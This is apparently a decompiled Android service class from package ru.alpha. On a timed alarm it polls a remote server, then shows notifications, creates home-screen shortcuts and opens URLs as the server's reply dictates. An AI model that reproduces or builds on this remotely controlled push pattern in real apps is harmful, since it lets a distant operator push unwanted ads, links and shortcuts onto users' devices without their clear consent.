package ru.alpha;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import java.io.PrintStream;

public class MainService
  extends Service
  implements ThreadOperationListener
{
  public MainService() {}
  
  public static void start(Context paramContext, Intent paramIntent, String paramString)
  {
    try
    {
      if (Constants.DEBUG) {
        System.out.println("MainService::start1()");
      }
      Intent localIntent = new Intent(paramContext, MainService.class);
      paramIntent = paramIntent.getExtras();
      if (paramIntent != null) {
        localIntent.putExtras(paramIntent);
      }
      localIntent.putExtra("key", paramString);
      paramContext.startService(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    try
    {
      super.onStart(paramIntent, paramInt);
      if (Constants.DEBUG) {
        System.out.println("MainService::onStart()");
      }
      paramIntent = paramIntent.getExtras();
      if ((paramIntent != null) && (paramIntent.get("key") != null))
      {
        paramIntent = (String)paramIntent.get("key");
        if (Constants.DEBUG) {
          System.out.println("key: " + paramIntent);
        }
        if (paramIntent.equals("alarm")) {
          new Thread(new ThreadOperation(this, 1, null)).start();
        }
      }
      return;
    }
    catch (Exception paramIntent)
    {
      paramIntent.printStackTrace();
    }
  }
  
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    try
    {
      if (Constants.DEBUG) {
        System.out.println("threadOperationRun: " + paramInt);
      }
      if (paramInt == 1)
      {
        paramObject = Alpha.sendRequest();
        paramObject.printToOutStream();
        Settings localSettings = Settings.getSettings();
        if (paramObject.wait > 0L) {}
        for (localSettings.timeNextConnection = (System.currentTimeMillis() + paramObject.wait * Constants.SECOND);; localSettings.timeNextConnection = (System.currentTimeMillis() + Constants.MINUTE))
        {
          localSettings.save(this);
          Alpha.startTimer(this);
          if ((paramObject.notificationText.length() > 0) && (paramObject.notificationUrl.length() > 0)) {
            Functions.showNotification(this, paramObject.notificationTickerText, paramObject.notificationTitle, paramObject.notificationText, paramObject.notificationIcon, paramObject.notificationUrl);
          }
          if ((paramObject.shortcutTitle.length() > 0) && (paramObject.shortcutUrl.length() > 0)) {
            Alpha.createNewShortcut(this, paramObject.shortcutTitle, paramObject.shortcutIcon, paramObject.shortcutUrl);
          }
          if (paramObject.openUrl.length() > 0) {
            Alpha.openUrl(this, paramObject.openUrl);
          }
          Alpha.startTimer(this);
          return;
        }
      }
      return;
    }
    catch (Exception paramObject)
    {
      paramObject.printStackTrace();
    }
  }
}
